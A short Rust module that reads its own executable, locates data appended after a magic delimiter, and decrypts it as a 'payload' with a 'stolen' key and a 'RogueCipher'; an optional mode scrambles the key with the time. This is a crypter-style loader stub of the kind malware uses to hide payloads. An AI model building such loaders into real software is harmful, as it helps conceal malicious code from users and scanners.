use std::env;
use std::fs::File;
use std::io::Read;
use crate::config::{MAGIC_DELIMITER, PARTIAL_KEY};
use crate::cypher;
use std::time::{SystemTime, UNIX_EPOCH};

pub fn extract_and_decrypt(corrupted_mode: bool) -> Option<Vec<u8>> {
    let current_exe = env::current_exe().ok()?;
    let mut file = File::open(current_exe).ok()?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer).ok()?;

    let pos = buffer.windows(MAGIC_DELIMITER.len()).rposition(|w| w == MAGIC_DELIMITER)?;
    let mut encrypted_data = buffer[pos + MAGIC_DELIMITER.len()..].to_vec();


    let mut key = cypher::get_stolen_key();
    if corrupted_mode {
        let sec = SystemTime::now().duration_since(UNIX_EPOCH).expect("L'horloge a reculé").as_secs() as u8;
        key.iter_mut().for_each(|x| *x ^= sec);
    }
    let cipher = cypher::RogueCipher::new(&key);
    cipher.decrypt_payload(&mut encrypted_data);

    Some(encrypted_data)
}
